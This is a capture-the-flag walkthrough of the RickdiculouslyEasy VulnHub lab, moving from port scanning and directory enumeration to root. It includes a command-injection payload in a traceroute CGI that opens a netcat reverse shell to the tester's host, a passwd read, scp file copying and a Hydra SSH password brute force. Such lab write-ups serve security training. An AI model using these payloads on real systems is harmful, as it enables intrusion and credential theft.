# RICKDICULOUSLYEASY: 1


# Enumeration

### NMAP

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ sudo nmap -sC -sV -Pn -p- -A 192.168.1.228
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 14:36 PDT
Nmap scan report for 192.168.1.228
Host is up (0.00037s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.166
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
22/tcp    open  ssh?
| fingerprint-strings: 
|   NULL: 
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
|_http-title: Morty's Website
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
9090/tcp  open  http    Cockpit web service 161 or earlier
|_http-title: Did not follow redirect to https://192.168.1.228:9090/
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
60000/tcp open  unknown
| fingerprint-strings: 
|   NULL, ibm-db2: 
|_    Welcome to Ricks half baked reverse shell...
|_drda-info: ERROR
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=4/22%Time=62631FD8%P=x86_64-pc-linux-gnu%r(NULL
SF:,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4
SF:\.0-31-generic\x20x86_64\)\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.92%I=7%D=4/22%Time=62631FD8%P=x86_64-pc-linux-gnu%r(N
SF:ULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.92%I=7%D=4/22%Time=62631FDE%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.
SF:\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20re
SF:verse\x20shell\.\.\.\n#\x20");
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 192.168.1.228

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.53 seconds

```

Taking a look at port 80, just an image and nothing in the source code

![Screenshot_2022-04-22_10-57-00](https://user-images.githubusercontent.com/68706090/164768977-f3e3d0b2-2a30-452f-8fea-96eab898a081.png)

```console 

<!DOCTYPE html>
<html>
<head>
<title>Morty's Website</title>
<center><font size="20" color="yellow"><b>MORTY'S COOL WEBSITE</b></font></center>
<center><font size = "5" color="yellow">It's not finished yet ok. Stop judging me.</font></center>
<style>
body 
{
    background-image: url("morty.png");
}
</style>
</head>
</html>
```

### GOBUSTER

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ gobuster dir -u http://192.168.1.228 -w /home/noob2uub/Documents/Wordlists/2.3-small.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.228
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/noob2uub/Documents/Wordlists/2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/22 10:59:40 Starting gobuster in directory enumeration mode
===============================================================
/passwords            (Status: 301) [Size: 239] [--> http://192.168.1.228/passwords/]
                                                                                     
===============================================================
2022/04/22 10:59:47 Finished
===============================================================
```

Lets take a look at /passwords 

![Screenshot_2022-04-22_11-00-56](https://user-images.githubusercontent.com/68706090/164769465-7e0d3afd-5e53-466b-840e-bf125995728a.png)

```console
FLAG{Yeah d- just don't do it.} - 10 Points
```

we have one flag and for 10 points a file called passwords.html, but it doesn't seem to give us anything valuable

```console
Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.
```
Without much more to go off of lets look at the other ports. Port 9090 looks interesting as a webservice. 

![Screenshot_2022-04-22_11-05-02](https://user-images.githubusercontent.com/68706090/164770105-b357f1c6-1934-4d1b-9701-71b977c9ad65.png)

```console
FLAG {THERE IS NO ZEUS, IN YOUR FACE!} - 10 POINTS
```
another flag, but i am not sure if this page will get us anywhere, the password field is disabled. I am sure we can dig deep on this one, and change the host file since we see the localhost.localdomain, but its suppose to be an easy box so lets not go down that hole. A few more ports are open. 

### FTP

```console
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> cat FLAG.txt
?Invalid command
ftp> get Flag.txt
local: Flag.txt remote: Flag.txt
200 PORT command successful. Consider using PASV.
550 Failed to open file.
ftp> quote PASV
227 Entering Passive Mode (192,168,1,228,117,229).
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> get FLAG.txt
local: FLAG.txt remote: FLAG.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
226 Transfer complete.
42 bytes received in 0.01 secs (3.0969 kB/s)
```
Had to use PSV mode to get the files

and we have another flag

```console 
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ cat FLAG.txt
FLAG{Whoa this is unexpected} - 10 Points
```

I completely forgot to look at the page source of passwords.html since it was not a text file

```console
<!DOCTYPE html>
<html>
<head>
<title>Morty's Website</title>
<body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
<!--Password: winter-->
</head>
</html>
```
We have morty's password winter

but SSH did not work on port 22222, morty is not a valid user name. So I decided to enumerate further with gobuster

### Gobuster

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ gobuster dir -u http://192.168.1.228 -w /home/noob2uub/Documents/Wordlists/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.228
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/noob2uub/Documents/Wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/22 11:35:35 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/cgi-bin/             (Status: 403) [Size: 217]
/passwords            (Status: 301) [Size: 239] [--> http://192.168.1.228/passwords/]
/robots.txt           (Status: 200) [Size: 126]                                      
                                                                                     
===============================================================
2022/04/22 11:35:37 Finished
===============================================================
```

uggg I even tried robots.txt and for some reason it did't load.

```console
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

Navigating to /root_shell.cgi

```console
<html><head><title>Root Shell
</title></head>
--UNDER CONSTRUCTION--
<!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG-->
<!--I'm sorry Morty. It's a bummer.-->
</html>
```

Navigating to tracertool.cgi we find something

![Screenshot_2022-04-22_11-39-44](https://user-images.githubusercontent.com/68706090/164774674-00de982a-1733-421a-90d1-315715442714.png)

Not having luck at anything on this yet so lets take a look at port 6000, nothing on the URL gave me anything good so, lets run Netcat on it.

### NC 

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ nc 192.168.1.228 60000
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt 
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points 
```

we have another flag and inside a shell with the ability to do nothing. We still have that tracert tool and port 13337

Running NC on that port I was able to get another flag. 

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ nc 192.168.1.228 13337
FLAG:{TheyFoundMyBackDoorMorty}-10Points
```
I finally was able to get a shell from the tracert console, I went through every reverse shell on pentest monkey and plus multple ports. I decided to try 4444 which is what metasploit runs off of.


```console
127.0.0.1; nc 192.168.1.166 4444 -e /bin/bash;
````
```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.1.166] from (UNKNOWN) [192.168.1.228] 46224
python3 -c 'import pty; pty.spawn("/bin/bash")'
ls
root_shell.cgi
tracertool.cgi
cd ..
ls
cgi-bin
html
whoami
apache
```
I couldn't find any flags, but it does not like cat lol

```console
cat passwd
                         _
                        | \
                        | |
                        | |
   |\                   | |
  /, ~\                / /
 X     `-.....-------./ /
  ~-. ~  ~              |
     \             /    |
      \  /_     ___\   /
      | /\ ~~~~~   \  |
      | | \        || |
      | |\ \       || )
     (_/ (_/      ((_/

```
 this was getting me no where so i went back to the tracert tool
 
 ![Screenshot_2022-04-22_12-20-57](https://user-images.githubusercontent.com/68706090/164780155-993c0d1d-67d6-4e7f-868f-a66efb543b2d.png)

Well looks like I enjoy cats, so I decided to try a few eithers vim, nano, and tail

![Screenshot_2022-04-22_12-20-57](https://user-images.githubusercontent.com/68706090/164780430-25e99c7d-8eaa-4825-b3cb-6ce35414677b.png)

```console
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
```

we have some more users
RickSanchez
Morty
Summer

I think I should of thought about this password winter goes with Summer, lets try to ssh now. 

### SSH

stupid box was case sensitive 

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ ssh summer@192.168.1.228 -p 22222
summer@192.168.1.228's password: 
Permission denied, please try again.
summer@192.168.1.228's password: 
Permission denied, please try again.
summer@192.168.1.228's password: 
summer@192.168.1.228: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ ssh Summer@192.168.1.228 -p 22222
Summer@192.168.1.228's password: 
Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
[Summer@localhost ~]$ 
```
USE TAIL!!!

```console
[Summer@localhost ~]$ ls
FLAG.txt
[Summer@localhost ~]$ cat FLAG.txt
                         _
                        | \
                        | |
                        | |
   |\                   | |
  /, ~\                / /
 X     `-.....-------./ /
  ~-. ~  ~              |
     \             /    |
      \  /_     ___\   /
      | /\ ~~~~~   \  |
      | | \        || |
      | |\ \       || )
     (_/ (_/      ((_/

[Summer@localhost ~]$ tail FLAG.txt
FLAG{Get off the high road Summer!} - 10 Points
[Summer@localhost ~]$ 
```

No SUDO for Summer

```console
[Summer@localhost ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for Summer: 
Sorry, user Summer may not run sudo on localhost.
[Summer@localhost ~]$ 
```
Lets take a look at the other folders

```console
[Summer@localhost home]$ ls
Morty  RickSanchez  Summer
[Summer@localhost home]$ cd Morty
[Summer@localhost Morty]$ ls
journal.txt.zip  Safe_Password.jpg
[Summer@localhost Morty]$ 
```
we see a few files, lets run SCP

### SCP

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ scp -P 22222 Summer@192.168.1.228:/home/Morty/journal.txt.zip .
Summer@192.168.1.228's password: 
journal.txt.zip                                                                                                               100%  414    29.2KB/s   00:00    
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ scp -P 22222 Summer@192.168.1.228:/home/Morty/Safe_Password.jpg .
Summer@192.168.1.228's password: 
Safe_Password.jpg                                                                                                             100%   42KB   9.1MB/s   00:00    
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ 
```
Running Strings on the image

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ strings Safe_Password.jpg 
JFIF
Exif
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
8BIM
8BIM
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
	#3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
0D000D\DDDD\t\\\\\t
tttttt
"$$848`44`
```

we see that we have a password of Meeseek, probably Mortys, now lets unzip the file 

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ unzip journal.txt.zip 
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: 
  inflating: journal.txt             
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points 
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ 
```

Another Flag: FLAG: {131333} - 20 Points 

Now lets take a look at RickSanchez folder

```console
[Summer@localhost home]$ cd RickSanchez
[Summer@localhost RickSanchez]$ ls
RICKS_SAFE  ThisDoesntContainAnyFlags
[Summer@localhost RickSanchez]$ cd ThisDoesntContainAnyFlags/
[Summer@localhost ThisDoesntContainAnyFlags]$ ls
NotAFlag.txt
[Summer@localhost ThisDoesntContainAnyFlags]$ tail NotAFlag.txt 
hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.
But seriously this isn't a flag..
[Summer@localhost ThisDoesntContainAnyFlags]$ ls -la
total 4
drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18  2017 .
drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21  2017 ..
-rw-rw-r--. 1 RickSanchez RickSanchez  95 Aug 18  2017 NotAFlag.txt
[Summer@localhost ThisDoesntContainAnyFlags]$ tail NotAFlag.txt 
hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.
But seriously this isn't a flag..
[Summer@localhost ThisDoesntContainAnyFlags]$ 
```

I guess that is not a flag, taking a look at safe, I could not run the file from his folder, but creating a /tmp directory that summer could execute it from allowed me to run his executable and the flag was the password

```console
Summer@localhost RICKS_SAFE]$ ls
safe
[Summer@localhost RICKS_SAFE]$ ./safe
-bash: ./safe: Permission denied
[Summer@localhost RICKS_SAFE]$ ./safe 131333
-bash: ./safe: Permission denied
[Summer@localhost RICKS_SAFE]$ cp safe /tmp/safe
[Summer@localhost RICKS_SAFE]$ cd /tmp
[Summer@localhost tmp]$ ls
safe  systemd-private-5af90257b75c4d688c7f049c22658970-chronyd.service-pkDDqe  systemd-private-5af90257b75c4d688c7f049c22658970-httpd.service-ibXPN3
[Summer@localhost tmp]$ cd safe
-bash: cd: safe: Not a directory
[Summer@localhost tmp]$ ./safe 131333
decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.�	@
[Summer@localhost tmp]$ 
```
Without the password 

```console
[Summer@localhost tmp]$ ./safe
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
```
So we have to make a wordlist, this is a head ache.... I found this tool that looks easy to use that is already on Kali. Crunch 

https://null-byte.wonderhowto.com/how-to/tutorial-create-wordlists-with-crunch-0165931/

### Hydra

```console
noob2uub@kali:~/Documents/vulnhub/rickdiculouslyeasy$ hydra -s 22222 -v -V -l RickSanchez -P ricklist.txt 192.168.1.228 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-22 13:43:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 781 login tries (l:1/p:781), ~49 tries per task
[DATA] attacking ssh://192.168.1.228:22222/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://RickSanchez@192.168.1.228:22222
[INFO] Successful, password authentication is supported by ssh://192.168.1.228:22222
[22222][ssh] host: 192.168.1.228   login: RickSanchez   password: P7Curtains
[STATUS] attack finished for 192.168.1.228 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-22 13:44:23

```
We have his password

### Sudo -l

```console
[RickSanchez@localhost ~]$ sudo -l
[sudo] password for RickSanchez: 
Matching Defaults entries for RickSanchez on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User RickSanchez may run the following commands on localhost:
    (ALL) ALL
[RickSanchez@localhost ~]$
```
(ALL) ALL

lets try sudo su

```console
[RickSanchez@localhost bin]$ sudo su
[root@localhost bin]# 
```
Cool we are root now lets find a flag

```console
[root@localhost bin]# cd /root
[root@localhost ~]# ls
anaconda-ks.cfg  FLAG.txt
[root@localhost ~]# tail FlAG.txt
tail: cannot open 'FlAG.txt' for reading: No such file or directory
[root@localhost ~]# tail FLAG.txt 
FLAG: {Ionic Defibrillator} - 30 points
```
Flag: FLAG: {Ionic Defibrillator} - 30 points

130 points total... 


